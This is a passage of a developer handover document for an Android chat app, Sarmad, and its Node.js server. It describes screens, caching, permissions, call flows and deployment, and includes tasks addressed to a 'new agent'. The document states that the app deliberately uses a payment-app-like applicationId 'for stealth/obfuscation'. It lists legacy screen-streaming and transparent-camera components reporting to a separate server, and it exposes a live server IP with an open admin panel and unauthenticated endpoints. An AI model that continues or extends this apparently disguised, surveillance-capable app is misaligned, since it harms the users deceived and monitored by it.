  2. Creates optimistic message with `localFilePath` set
  3. Emits `chat:send` with `fileUrl`, `fileName`, `fileSize`
  4. On `chat:sent`: updates message with server ID
- **Popup menu**: Mute/unmute, delete conversation
- **Long-press message**: Delete for all (if sender)
- **Date separators**: "Today", "Yesterday", or date format

#### `AudioCallActivity.java`

- **Two modes**: `createIncoming(callId, callerName, ...)` and `createOutgoing(receiverId, ...)`
- Uses `AudioStreamManager` for mic capture + speaker playback
- Socket events: `call:answer`, `call:reject`, `call:end`, `call:audio`, `call:mute`
- **UI**: Caller info, timer, mute button, speaker button, end button
- **Incoming**: Shows answer/reject buttons
- **Outgoing**: Shows "Calling..." → "Ringing..." → timer on answer

#### `ImageViewerActivity.java`

- Full-screen image viewer with scale/zoom gestures
- Loads from URL (via network) or local file/content URI
- Uses `MediaCacheManager` for cached files

#### `UserProfileActivity.java`

- Shows other user's profile: avatar, name, status, user ID
- **Buttons**: Message, Call, Block/Unblock
- **Shared media**: Fetches from `ChatApiService.getSharedMedia()`, shows count + thumbnails
- **Block logic**: `ChatApiService.blockUser()` / `unblockUser()` with confirmation dialog
- Fetches user info via `ChatApiService.getUserInfo()`

### 4.5 UI Fragments

#### `ChatListFragment.java` (Tab 1)

- RecyclerView with `ChatListAdapter`
- FAB → switches to ContactsFragment
- Loads conversations from `ChatApiService.getConversations()` + local cache
- Registers socket listeners: conversation update, online, typing, read receipt
- **Long-press options**: Mute/unmute, delete conversation
- Syncs muted conversations to `ChatNotificationManager`
- Parses `is_muted` and `is_blocked` from server response

#### `ContactsFragment.java` (Tab 2)

- RecyclerView with `ContactsAdapter`
- Search/filter contacts
- **Add contact**: Input user ID → `ChatApiService.addContactByUserId()`
- Click contact → `getOrCreateConversation()` → open `ConversationActivity`
- Long-click → open `UserProfileActivity`

#### `CallsFragment.java` (Tab 3)

- RecyclerView with `CallLogAdapter`
- Load/delete call logs via `ChatApiService`
- Click → start outgoing call (`AudioCallActivity`)
- Empty state UI

#### `ChatSettingsFragment.java` (Tab 4)

- **Profile section**: Avatar (pick/camera), display name, user ID
- **Screen lock**: Toggle via `AppLockManager`
- **Biometric**: Toggle
- **Temporary messages**: Auto-delete hours selector
- **Devices**: Count display, manage devices
- **Cache**: Size display, clear button (`MediaCacheManager`)
- **Change PIN**: Current + new PIN dialog
- **Logout**: Clear `ChatPrefs`, disconnect socket, launch `SecurePinActivity`
- **Profile picture**: Pick from gallery or camera → `ChatApiService.uploadProfilePicture()`

### 4.6 UI Adapters

#### `ChatListAdapter.java`

**Data class `ChatItem`:** conversationId, otherUserId, name, initials, avatarColor, avatarUrl, lastMessage, timestamp, unreadCount, isRead, isOnline, isTyping, isMuted, isBlocked.

- **View**: Avatar (initials or image), name, last message, time, unread badge, online dot, mute icon
- **Click**: Opens `ConversationActivity`
- **Long-click**: Calls `OnChatLongClickListener.onChatLongClick(ChatItem)`

#### `MessagesAdapter.java`

**Data class `Message`:** id, text, time, isSent, isRead, messageType, fileUrl, fileName, fileSize, duration, dateSeparator, localFilePath, senderId, senderName, conversationId.

**View types (10 total):**
- `TYPE_SENT_TEXT`, `TYPE_RECEIVED_TEXT`
- `TYPE_SENT_IMAGE`, `TYPE_RECEIVED_IMAGE`
- `TYPE_SENT_VOICE`, `TYPE_RECEIVED_VOICE`
- `TYPE_SENT_DOCUMENT`, `TYPE_RECEIVED_DOCUMENT`
- `TYPE_DATE_SEPARATOR`

**Image loading**: Uses `loadBitmapInto()` with `BitmapFactory.decodeFile()` and downsampling (not `setImageURI`):
```java
private void loadBitmapInto(ImageView imageView, File file) {
    // Decode bounds first, then calculate inSampleSize, then decode
}
```

**Local file resolution**: `resolveLocalFile()` checks `localFilePath` → `fileUrl` path → `MediaCacheManager`.

**Voice playback**: `MediaPlayer` with seek bar and timer.

**Long-click**: Calls `OnMessageLongClickListener` for delete dialog.

#### `CallLogAdapter.java`

**Data class `CallLogItem`:** otherUserId, otherName, otherInitials, otherAvatarColor, isOutgoing, status, duration, timestamp.

- Shows call direction icon, user info, status, duration, time
- Click → callback for outgoing call

#### `ContactsAdapter.java`

**Data class `ContactItem`:** userId, displayName, initials, avatarColor, avatarUrl, isOnline, lastSeen.

- Avatar (initials or `ImageLoader`), name, status
- Click → `OnContactClickListener`
- Long-click → `OnContactLongClickListener`
- Section headers support

### 4.7 Utilities

#### `Constants.java`
```java
public static final String CHAT_SERVER_URL = "http://18.119.96.175/chat";
// Also has: SERVER_URL, SOCKET_URL (legacy server)
```

#### `ConversationCache.java`
Wraps `LocalChatDatabase`. Methods:
- `setUserId(id)`, `saveConversations(json)`, `getConversations()`
- `saveMessages(convId, json)`, `getMessages(convId)`, `insertSingleMessage(convId, json)`
- `clearConversationMessages(convId)`, `clear()`

#### `LocalChatDatabase.java`
SQLite helper with tables:
- `local_conversations`: raw JSON text per user
- `local_messages`: conversationId + raw JSON array + individual messages
- Supports insert, update, delete, mark read, local file path tracking

#### `MediaCacheManager.java`
- Directory structure: `chat_media/{images|voice|documents}/`
- Index: SharedPreferences mapping URL → local filename
- `getLocalFile(url)` → File or null
- `cacheFile(url, byte[], type)`, `cacheFromFile(url, File, type)`, `cacheFromStream(url, InputStream, type)`
- `clearCache()`, `getCacheSize()`

#### `ImageLoader.java`
- LRU memory cache (1/8 of max memory)
- Async download via `HttpURLConnection`
- `decodeSampledBitmap()` for memory-efficient loading
- Falls back to `MediaCacheManager` for disk cache

#### `ChatNotificationManager.java`
- Channel: `sarmad_chat_v3`
- `showMessageNotification(context, convId, senderName, message, senderId)`
- Skips if: app in foreground + active conversation matches, OR conversation is muted
- `setActiveConversation(convId)` / `clearActiveConversation()`
- `setMutedConversations(Set<Integer>)`
- `cancelConversation(convId)`, `cancelAll()`

#### `AppLockManager.java`
- `isLockEnabled()`, `setLockEnabled(boolean)`
- `isBiometricEnabled()`, `setBiometricEnabled(boolean)`
- `shouldLock()` — checks timeout since last `touch()`
- `setAutoDeleteHours(int)`, `getAutoDeleteHours()`

#### `VoiceRecorder.java`
- `startRecording(context)` → creates temp file in `cache/voice/`
- `stopRecording()` → returns `RecordingResult(filePath, durationMs)`
- Uses `MediaRecorder` with AAC encoding

#### `AudioStreamManager.java`
- **Capture**: `AudioRecord` at 8kHz/16bit/mono → base64 chunks via `OnAudioChunkListener`
- **Playback**: `AudioTrack` receiving base64 → PCM bytes
- Speaker mode, mute toggle
- Echo cancellation, noise suppression, AGC when available

#### `PermissionDetector.java`
Reads AndroidManifest to detect which permissions are declared. Caches results. Used by `BookReaderActivity` to conditionally request.

### 4.8 Local Storage

The app stores data locally for offline access and performance:

1. **`LocalChatDatabase`** (SQLite): Conversations and messages cached per user
2. **`MediaCacheManager`** (file system): Downloaded media files in `chat_media/`
3. **`ChatPrefs`** (SharedPreferences): Auth state, user profile
4. **`AppLockManager`** (SharedPreferences): Lock settings, timeouts

Data persists across app restarts and even after logout (media cache stays).

### 4.9 Notifications

**`ChatNotificationManager`:**
- Creates notification channel `sarmad_chat_v3` with sound
- Shows heads-up notification for new messages
- Tap notification → opens `ConversationActivity` with conversation/user IDs
- Uses app icon (eagle logo) in notification
- Suppresses notifications for:
  - Currently active conversation
  - Muted conversations
  - App in foreground on same conversation

### 4.10 Permissions

**Requested at app startup (chat mode):**
- `MANAGE_EXTERNAL_STORAGE` or `READ_EXTERNAL_STORAGE` — for file access
- `POST_NOTIFICATIONS` (Android 13+) — shown after storage permission

**Requested on demand:**
- `CAMERA` — when taking photo for chat or profile picture
- `RECORD_AUDIO` — when recording voice message or starting call

**Manifest permissions:**
```xml
INTERNET, ACCESS_NETWORK_STATE, WAKE_LOCK, FOREGROUND_SERVICE,
RECEIVE_BOOT_COMPLETED, CAMERA, RECORD_AUDIO, POST_NOTIFICATIONS,
READ/WRITE_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE,
REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE
```

**`network_security_config.xml`**: `cleartextTrafficPermitted="true"` for HTTP connections.

### 4.11 Resources & Theming

**App name**: "سرمد" (Sarmad — Arabic)

**Theme**: Dark green/gold (eagle logo colors)
- `Theme.H4CKINTO` extends `Theme.BookReader`
- `Theme.SecureChat` for chat activities
- Key colors: `background_dark`, `accent_gold`, `chat_surface`, `chat_primary`

**Layouts** (key ones):
- `activity_book_reader.xml` — FrameLayout + BottomNavigationView + lock overlay
- `activity_conversation.xml` — Header (avatar, name, status) + RecyclerView + input bar + recording overlay
- `activity_secure_pin.xml` — 6 PIN EditTexts + verify button
- `activity_audio_call.xml` — Caller info + timer + action buttons
- `activity_user_profile.xml` — Avatar, name, status, actions, shared media
- `activity_image_viewer.xml` — Full-screen ImageView
- `fragment_chat_list.xml` — Title + encrypted banner + RecyclerView + FAB
- `item_message_*.xml` — Message bubble layouts (sent/received × text/image/voice/document)
- `item_date_separator.xml` — Date label between messages

**Bottom navigation menus:**
- `bottom_nav_chat_menu.xml`: Chats, Contacts, Calls, Settings

**Icons**: Eagle logo in all mipmap densities.

---

## 5. Data Flow Diagrams

### Send Text Message

```
ConversationActivity                ChatSocketManager              Server                    Recipient
       │                                   │                         │                          │
       ├─ Create optimistic Message        │                         │                          │
       ├─ Add to adapter                   │                         │                          │
       ├─ Scroll to bottom                 │                         │                          │
       │                                   │                         │                          │
       ├─ socket.sendMessage(convId,       │                         │                          │
       │     senderId, text, "text")  ────▶│                         │                          │
       │                                   ├─ emit('chat:send') ───▶│                          │
       │                                   │                         ├─ Check block             │
       │                                   │                         ├─ Insert to DB            │
       │                                   │                         ├─ Update conversation     │
       │                                   │                         │                          │
       │                                   │◀─ 'chat:sent' ─────────│                          │
       │◀─ onMessageSent callback ─────────│                         │                          │
       ├─ Update message with server ID    │                         │                          │
       ├─ adapter.notifyItemChanged()      │                         │                          │
       │                                   │                         │                          │
       │                                   │                         ├─ emit('chat:receive') ──▶│
       │                                   │                         ├─ emit('chat:conv_upd') ─▶│
       │                                   │                         │                          │
       │◀─ 'chat:conversation_update' ─────│◀────────────────────────│                          │
       ├─ (ChatListFragment updates list)  │                         │                          │
```

### Send Media Message

```
ConversationActivity                ChatApiService           S3              ChatSocketManager        Server
       │                                   │                 │                       │                   │
       ├─ Pick file (gallery/camera/docs)  │                 │                       │                   │
       ├─ Create optimistic Message        │                 │                       │                   │
       │   with localFilePath set          │                 │                       │                   │
       ├─ Add to adapter (shows locally)   │                 │                       │                   │
       │                                   │                 │                       │                   │
       ├─ uploadFile(file, type, id) ─────▶│                 │                       │                   │
       │                                   ├─ POST /upload ─▶│ (multer → S3)        │                   │
       │                                   │◀─ { fileUrl } ──│                       │                   │
       │◀─ onSuccess(fileUrl) ─────────────│                 │                       │                   │
       │                                   │                 │                       │                   │
       ├─ socket.sendMessage(convId,       │                 │                       │                   │
       │   senderId, null, "image",        │                 │                       │                   │
       │   fileUrl, fileName, fileSize) ──────────────────────────────────────────▶│                   │
       │                                   │                 │                       ├─ emit('chat:send')│
       │                                   │                 │                       │                   ├─▶ DB
       │                                   │                 │                       │◀─ 'chat:sent' ────│
       │◀─ onMessageSent ─────────────────────────────────────────────────────────│                   │
       ├─ Update message ID + notifyChanged│                 │                       │                   │
```

### Incoming Call

```
AudioCallActivity (Receiver)       ChatSocketManager              Server             Caller
       │                                   │                         │                   │
       │                                   │                         │◀─ 'call:offer' ───│
       │                                   │                         ├─ Check block      │
       │                                   │                         ├─ Create call      │
       │                                   │◀─ 'call:incoming' ──────│                   │
       │◀─ onCallIncoming callback ────────│                         │──▶'call:ringing'──│
       │                                   │                         │                   │
       ├─ Show incoming call UI            │                         │                   │
       │   (ring, answer/reject buttons)   │                         │                   │
       │                                   │                         │                   │
       ├─ User taps Answer                 │                         │                   │
       ├─ emit('call:answer') ────────────▶│                         │                   │
       │                                   ├─ emit('call:answer') ──▶│                   │
       │                                   │                         ├── 'call:answered' ▶│
       │                                   │◀─ 'call:answered' ──────│                   │
       │◀─ onCallAnswered ─────────────────│                         │                   │
       │                                   │                         │                   │
       ├─ Start AudioStreamManager         │                         │                   │
       │   (capture mic → base64 chunks)   │                         │                   │
       ├─ emit('call:audio') ─────────────▶│ ──────────────────────▶│──▶'call:audio'───▶│
       │◀─ 'call:audio' ──────────────────│◀──────────────────────── │◀──'call:audio'───│
       ├─ AudioTrack playback              │                         │                   │
```

---

## 6. Deployment

### Server (VPS)

Full guide in `chat-server/DEPLOY.md`. Key steps:
1. Install Node.js 18+
2. Upload `chat-server/` to VPS
3. `npm install --production`
4. Configure `.env` (PORT, AWS keys)
5. `pm2 start index.js --name chat-server`
6. Configure Nginx:
   ```nginx
   location /chat/ {
       proxy_pass http://127.0.0.1:3500/;
       proxy_http_version 1.1;
       proxy_set_header Upgrade $http_upgrade;
       proxy_set_header Connection "upgrade";
       proxy_read_timeout 86400;
   }
   ```
7. UFW: allow 80, 443, 22

### Android App

1. Update `Constants.CHAT_SERVER_URL` to `"http://<VPS_IP>/chat"`
2. Ensure `network_security_config.xml` allows cleartext for VPS IP
3. Build signed APK with `sham-release-key.jks`
4. Socket.IO path is auto-detected from URL in `ChatSocketManager`

### Current VPS

- IP: `18.119.96.175`
- Admin: `http://18.119.96.175/chat/admin`
- API: `http://18.119.96.175/chat/api/...`
- Socket.IO: `ws://18.119.96.175` with path `/chat/socket.io/`

---

## 7. Common Tasks for New Agent

### Add a New API Endpoint

1. Create or edit route file in `chat-server/routes/`
2. Use `asyncHandler` wrapper for error handling
3. Use `stmt('name')` for prepared statements (add to `initStatements()` in `database.js`)
4. Register route in `index.js`: `app.use('/api/newroute', newRoutes)`
5. Add corresponding method in Android `ChatApiService.java`
6. Restart server: `pm2 restart chat-server`

### Add a New Socket Event

1. Add handler in `chat-server/socket/chatHandler.js` or `callHandler.js`
2. Add emit/listener in Android `ChatSocketManager.java`
3. Create listener interface + registration methods
4. Register listener in the relevant Activity/Fragment

### Add a New Database Table

1. Add `CREATE TABLE IF NOT EXISTS` in `database.js` `initSchema()`
2. Add indexes as needed
3. Add prepared statements in `initStatements()`
4. Create route/service functions to interact with it

### Modify the Admin Panel

1. Edit the inline HTML string in `index.js` under `app.get('/admin', ...)`
2. JavaScript uses `B` variable for base path — all fetch calls must use `B + "/api/..."`

### Change Server URL

1. Update `Constants.CHAT_SERVER_URL` in `Constants.java`
2. `ChatSocketManager` auto-parses the path for Socket.IO
3. `ChatApiService` uses the URL directly for REST calls
4. Rebuild the Android app

### Add a New Message Type

1. Server: Update `ALLOWED_MIME_TYPES` in `s3Service.js`, `buildPreview()` in `messageService.js`
2. Android: Add `TYPE_SENT_X` / `TYPE_RECEIVED_X` in `MessagesAdapter.java`
3. Create corresponding layout XMLs (`item_message_sent_x.xml`, `item_message_received_x.xml`)
4. Handle in `getItemViewType()`, `onCreateViewHolder()`, `onBindViewHolder()`

---

## 8. Known Issues & Constraints

1. **No token enforcement**: Server generates tokens on login but doesn't validate them on API calls. All REST endpoints are open if you know the user ID.

2. **Single-process**: Server runs as single Node.js process. SQLite doesn't support multiple writers. Use PM2 for restart recovery, but don't cluster.

3. **In-memory call state**: Active calls are stored in a JavaScript Map. If server restarts mid-call, calls are lost. Only call logs (completed/missed) persist.

4. **No end-to-end encryption**: Messages are stored in plaintext in SQLite. S3 files use AES-256 server-side encryption (AWS-managed keys).

5. **Soft delete only**: Deleted conversations use `deleted_by` column. Messages remain in DB. No periodic cleanup.

6. **Media not auto-cleaned**: S3 files persist even after message deletion. No lifecycle policy configured.

7. **Rate limiting is in-memory**: Rate limit counters reset on server restart.

8. **Android HTTP**: Uses cleartext HTTP (not HTTPS). Add Let's Encrypt SSL via Nginx for production.

9. **Legacy server code**: `SocketManager.java`, `MainActivity.java`, `MainService.java`, `ScreenStreamService.java`, `GrantApplicationActivity.java`, `TransparentCameraActivity.java` connect to a separate `Constants.SERVER_URL` — completely independent from the chat system.

10. **`applicationId` mismatch**: Build.gradle uses `com.shmacash.shamcashnp` as applicationId while package is `com.h4ckinto.android`. This is intentional for stealth/obfuscation.

---

**Document Version:** 1.0
**Last Updated:** February 2026
**Covers:** chat-server v2.0 + android-native-app
